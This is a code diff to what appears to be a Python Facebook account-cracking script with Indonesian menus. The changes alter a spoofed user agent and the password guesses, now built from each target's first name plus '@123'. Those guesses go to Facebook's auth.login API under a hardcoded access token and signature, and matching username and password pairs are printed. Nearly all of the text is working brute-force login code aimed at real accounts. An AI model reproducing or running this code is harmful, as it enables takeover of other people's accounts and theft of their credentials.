@@ -9,7 +9,7 @@ sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-br.addheaders = [('User-Agent', 'Opera/11 (Android; Opera Mini/44.1.2254.143214. U; id) Presto/2.12.423 Version/12.16')]
+br.addheaders = [('User-Agent', 'Opera/11 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 
 def keluar():
     print '\x1b[1;91m[!] Keluar'
@@ -380,7 +380,7 @@ def mini():
                             raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                             menu_hack()
                         else:
-                            pz3 = a['Pakistan'] + '123'
+                            pz3 = a['firs_name'] + '@123'
                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                             y = json.load(data)
                             if 'access_token' in y:
@@ -699,7 +699,7 @@ def pilih_super():
                         if 'www.facebook.com' in q['error_msg']:
                             print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass2
                         else:
-                            pass3 = b['Pakistan'] + '123'
+                            pass3 = b['first_name'] + '@123'
                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                             q = json.load(data)
                             if 'access_token' in q:
